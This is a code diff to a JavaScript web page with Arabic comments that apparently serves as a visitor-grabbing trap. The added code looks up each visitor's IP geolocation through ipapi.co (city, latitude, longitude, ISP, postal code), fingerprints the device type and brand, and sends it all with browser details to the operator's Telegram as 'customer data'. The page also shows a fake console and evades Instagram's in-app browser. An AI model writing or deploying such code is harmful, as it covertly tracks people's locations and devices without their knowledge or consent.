@@ -21,6 +21,58 @@ function isInstagramBrowser() {
     return /Instagram/.test(ua);
 }
 
+// دالة لتحديد نوع الجهاز
+function getDeviceType() {
+    const ua = navigator.userAgent.toLowerCase();
+    if (/iphone|ipad|ipod/.test(ua)) {
+        return 'iPhone/iPad';
+    } else if (/android/.test(ua)) {
+        return 'Android';
+    } else if (/windows/.test(ua)) {
+        return 'Windows';
+    } else if (/macintosh|mac os x/.test(ua)) {
+        return 'Mac';
+    } else if (/linux/.test(ua)) {
+        return 'Linux';
+    } else {
+        return 'جهاز غير معروف';
+    }
+}
+
+// دالة لتحديد العلامة التجارية للجهاز
+function getDeviceBrand() {
+    const ua = navigator.userAgent.toLowerCase();
+    if (/iphone|ipad|ipod/.test(ua)) {
+        return 'Apple';
+    } else if (/samsung/.test(ua) || /sm-|gt-|sch-/i.test(ua)) {
+        return 'Samsung';
+    } else if (/huawei/.test(ua) || /hbbx/.test(ua)) {
+        return 'Huawei';
+    } else if (/xiaomi/.test(ua) || /mi |redmi/.test(ua)) {
+        return 'Xiaomi';
+    } else if (/oppo/.test(ua)) {
+        return 'OPPO';
+    } else if (/vivo/.test(ua)) {
+        return 'Vivo';
+    } else if (/oneplus/.test(ua)) {
+        return 'OnePlus';
+    } else if (/nokia/.test(ua)) {
+        return 'Nokia';
+    } else if (/sony/.test(ua) || /xperia/.test(ua)) {
+        return 'Sony';
+    } else if (/lg-/.test(ua)) {
+        return 'LG';
+    } else if (/motorola/.test(ua) || /moto/.test(ua)) {
+        return 'Motorola';
+    } else if (/android/.test(ua)) {
+        return 'Android غير معروف';
+    } else if (/windows/.test(ua) || /macintosh|mac os x/.test(ua) || /linux/.test(ua)) {
+        return 'غير معروف';
+    } else {
+        return 'غير معروف';
+    }
+}
+
 // التحقق من متصفح إنستغرام عند تحميل الصفحة
 window.onload = () => {
     if (isInstagramBrowser()) {
@@ -35,13 +87,12 @@ window.onload = () => {
             allowOutsideClick: false,
             allowEscapeKey: false
         }).then(() => {
-            // إعادة توجيه المستخدم إلى متصفح خارجي (اختياري)
             window.location.href = 'https://www.google.com';
         });
-        return; // إيقاف تنفيذ باقي الكود
+        return;
     }
 
-    // تهيئة Firebase فقط إذا لم يكن المتصفح إنستغرام
+    // تهيئة Firebase
     const app = initializeApp(firebaseConfig);
     const db = getDatabase(app);
 
@@ -176,26 +227,55 @@ window.onload = () => {
         }
     }
 
+    // دالة لجلب بيانات الـ IP باستخدام ipapi.co
+    async function getIPInfo() {
+        try {
+            console.log('جاري جلب بيانات الـ IP من ipapi.co...');
+            const response = await fetch('https://ipapi.co/json/');
+            if (!response.ok) {
+                throw new Error(`فشل جلب بيانات الـ IP: ${response.status}`);
+            }
+            const data = await response.json();
+            return {
+                ip: data.ip || 'مش متوفر',
+                country: data.country_name || 'مش متوفر',
+                region: data.region || 'مش متوفر',
+                city: data.city || 'مش متوفر',
+                latitude: data.latitude || 'مش متوفر',
+                longitude: data.longitude || 'مش متوفر',
+                org: data.org || 'مش متوفر',
+                timezone: data.timezone || 'مش متوفر',
+                postal: data.postal || 'مش متوفر'
+            };
+        } catch (error) {
+            console.error('خطأ في جلب بيانات الـ IP:', error);
+            return {
+                ip: 'مش متوفر',
+                country: 'مش متوفر',
+                region: 'مش متوفر',
+                city: 'مش متوفر',
+                latitude: 'مش متوفر',
+                longitude: 'مش متوفر',
+                org: 'مش متوفر',
+                timezone: 'مش متوفر',
+                postal: 'مش متوفر'
+            };
+        }
+    }
+
     // جلب معلومات المستخدم
     async function getUserInfo(name = 'مش معروف') {
         if (!canAttempt()) return;
 
         try {
-            let ipData = { ip: 'مش متوفر' };
-            try {
-                console.log('جاري جلب عنوان الـ IP...');
-                const ipResponse = await fetch('https://api.ipify.org?format=json', { mode: 'cors' });
-                ipData = await ipResponse.json();
-            } catch (error) {
-                console.error('خطأ في جلب الـ IP:', error);
-            }
+            // جلب بيانات الـ IP من ipapi.co
+            const ipData = await getIPInfo();
 
             const visitorCount = await getVisitorCount();
             const userAgent = navigator.userAgent || 'مش متوفر';
             const screenResolution = `${window.screen.width}x${window.screen.height}`;
             const windowSize = `${window.innerWidth}x${window.innerHeight}`;
             const language = navigator.language || 'مش متوفر';
-            const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone || 'مش متوفر';
             const onlineStatus = navigator.onLine ? 'متصل' : 'مش متصل';
             let batteryStatus = 'مش معروف';
             const platform = navigator.platform || 'مش متوفر';
@@ -206,7 +286,8 @@ window.onload = () => {
             const maxTouchPoints = navigator.maxTouchPoints || 'مش معروف';
             let storageQuota = 'مش معروف';
             let webGLVersion = 'مش معروف';
-            const deviceType = /Mobile|Android|iPhone|iPad/.test(userAgent) ? 'موبايل' : 'كمبيوتر';
+            const deviceType = getDeviceType();
+            const deviceBrand = getDeviceBrand();
 
             if (navigator.getBattery) {
                 try {
@@ -236,8 +317,24 @@ window.onload = () => {
                 console.error('خطأ في جلب WebGL:', error);
             }
 
-            const message = `*بيانات الزبون:*\n👤 *الاسم*: ${name}\n📊 *عدد الزوار*: ${toArabicNumerals(visitorCount)}\n🖥️ *الآي بي*: ${ipData.ip}\n🌐 *المتصفح*: ${userAgent}\n📏 *دقة الشاشة*: ${screenResolution}\n🖼️ *حجم النافذة*: ${windowSize}\n🗣️ *اللغة*: ${language}\n🕒 *المنطقة الزمنية*: ${timeZone}\n📶 *الحالة*: ${onlineStatus}\n🔋 *البطارية*: ${batteryStatus}\n💻 *النظام*: ${platform}\n🧠 *الذاكرة*: ${deviceMemory} جيجا\n🎨 *عمق الألوان*: ${toArabicNumerals(colorDepth)} بت\n🌐 *سرعة النت*: ${connectionSpeed}\n⏱️ *مدة الجلسة*: ${toArabicNumerals(sessionTime)} ثانية\n👆 *نقاط اللمس*: ${maxTouchPoints}\n💾 *التخزين*: ${storageQuota}\n🖌️ *WebGL*: ${webGLVersion}\n📱 *نوع الجهاز*: ${deviceType}`;
+            // إنشاء الرسالة مع بيانات ipapi.co
+            const message = `*بيانات الزبون:*\n👤 *الاسم*: ${name}\n📊 *عدد الزوار*: ${toArabicNumerals(visitorCount)}\n🖥️ *الآي بي*: ${ipData.ip}\n🌍 *البلد*: ${ipData.country}\n🏞️ *المنطقة*: ${ipData.region}\n🏙️ *المدينة*: ${ipData.city}\n📍 *خط العرض*: ${ipData.latitude}\n📍 *خط الطول*: ${ipData.longitude}\n🌐 *مزود الخدمة*: ${ipData.org}\n🕒 *المنطقة الزمنية*: ${ipData.timezone}\n📮 *الرمز البريدي*: ${ipData.postal}\n🌐 *المتصفح*: ${userAgent}\n📏 *دقة الشاشة*: ${screenResolution}\n🖼️ *حجم النافذة*: ${windowSize}\n🗣️ *اللغة*: ${language}\n📶 *الحالة*: ${onlineStatus}\n🔋 *البطارية*: ${batteryStatus}\n💻 *النظام*: ${platform}\n🧠 *الذاكرة*: ${deviceMemory} جيجا\n🎨 *عمق الألوان*: ${toArabicNumerals(colorDepth)} بت\n🌐 *سرعة النت*: ${connectionSpeed}\n⏱️ *مدة الجلسة*: ${toArabicNumerals(sessionTime)} ثانية\n👆 *نقاط اللمس*: ${maxTouchPoints}\n💾 *التخزين*: ${storageQuota}\n🖌️ *WebGL*: ${webGLVersion}\n📱 *نوع الجهاز*: ${deviceType}\n🏷️ *العلامة التجارية*: ${deviceBrand}`;
             await sendToTelegram(message);
+
+            // عرض بيانات الـ IP في واجهة المستخدم
+            const ipInfoElement = document.getElementById('ip-info');
+            ipInfoElement.innerHTML = `
+                <h3>معلومات الـ IP:</h3>
+                <p><strong>الآي بي:</strong> ${ipData.ip}</p>
+                <p><strong>البلد:</strong> ${ipData.country}</p>
+                <p><strong>المنطقة:</strong> ${ipData.region}</p>
+                <p><strong>المدينة:</strong> ${ipData.city}</p>
+                <p><strong>خط العرض:</strong> ${ipData.latitude}</p>
+                <p><strong>خط الطول:</strong> ${ipData.longitude}</p>
+                <p><strong>مزود الخدمة:</strong> ${ipData.org}</p>
+                <p><strong>المنطقة الزمنية:</strong> ${ipData.timezone}</p>
+                <p><strong>الرمز البريدي:</strong> ${ipData.postal}</p>
+            `;
 
             const progress = document.getElementById('progress');
             progress.style.width = '100%';
@@ -361,6 +458,7 @@ window.onload = () => {
         document.getElementById('upload-button').classList.remove('hidden');
         document.getElementById('progress').style.width = '0';
         document.getElementById('fake-console').innerHTML = '';
+        document.getElementById('ip-info').innerHTML = '';
         getUserInfo();
     }
 
@@ -415,7 +513,7 @@ window.onload = () => {
                     });
                 });
             } else {
-                sendToTelegram(`*الاسم*: ${name}`);
+                sendToTelegram(`*الاسم*: ${name}\n📱 *نوع الجهاز*: ${getDeviceType()}\n🏷️ *العلامة التجارية*: ${getDeviceBrand()}`);
             }
         }
     });
